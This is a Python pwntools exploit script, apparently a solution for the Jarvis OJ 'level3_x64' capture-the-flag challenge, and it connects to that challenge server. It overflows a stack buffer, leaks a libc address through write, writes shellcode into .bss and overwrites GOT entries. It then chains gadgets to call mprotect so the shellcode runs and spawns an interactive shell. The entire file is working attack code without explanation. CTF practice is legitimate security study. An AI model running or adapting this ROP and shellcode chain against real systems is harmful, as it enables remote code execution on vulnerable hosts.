from pwn import *

context.log_level = "debug"
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#p = process('level3_x64')
#p = remote('127.0.0.1', 4000)
p=remote('pwn2.jarvisoj.com',9884)

elf = ELF('level3_x64')
libc = ELF('libc-2.19.so')

write_plt = elf.plt['write']
write_got = elf.got['write']
write_off = libc.symbols['write']
vuln_func = elf.symbols['vulnerable_function']
pop_rdi = 0x00000000004006b3
pop_rsi_r15 = 0x00000000004006b1

payload = 'a' * 136
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(write_got)
payload += p64(111)
payload += p64(write_plt)
payload += p64(vuln_func)

p.recvuntil('Input:\n')
p.send(payload)
sleep(0.2)
pause()

write_addr =u64(p.recv(8))
libc_base = write_addr - write_off
mprotect = libc_base + libc.symbols['mprotect']
log.info("libc_base : [%#x]" % libc_base)
log.info("mprotect : [%#x]" % mprotect)

read_plt = elf.plt['read']
shell_buf = elf.bss()
#shellcode = asm(shellcraft.amd64.sh())
shellcode = asm(shellcraft.sh())

payload = 'a' * 136 
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(shell_buf)
payload += p64(111)
payload += p64(read_plt)
payload += p64(vuln_func)

p.recvuntil('Input:\n')
p.send(payload)
sleep(0.2)
p.send(shellcode)
sleep(0.2)
pause()

shell_got = 0x600A48
payload = 'a' * 136 
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(shell_got)
payload += p64(111)
payload += p64(read_plt)
payload += p64(vuln_func)

p.recvuntil('Input:\n')
p.send(payload)
sleep(0.2)
p.send(p64(shell_buf))
sleep(0.2)
pause()

mprotect_got = 0x600A50
payload = 'a' * 136
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(mprotect_got)
payload += p64(111)
payload += p64(read_plt)
payload += p64(vuln_func)

p.recvuntil('Input:\n')
p.send(payload)
sleep(0.2)
p.send(p64(mprotect))
sleep(0.2)
pause()

rop1 = 0x00000000004006AA
rop2 = 0x0000000000400690
payload = 'a' * 136
payload += p64(rop1)
payload += p64(0)	#rbx
payload += p64(1)	#rbp
payload += p64(mprotect_got)	#r12
payload += p64(7)	#r13 == edx
payload += p64(0x1000)	#r14 == rsi
payload += p64(0x600000)	#r15 == rdi
payload += p64(rop2)

payload += p64(0)
payload += p64(1)
payload += p64(shell_got)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(rop2)
#gdb.attach(p)
#p.recvuntil('Input:\n')
p.send(payload)

#gdb.attach(p)

p.interactive()

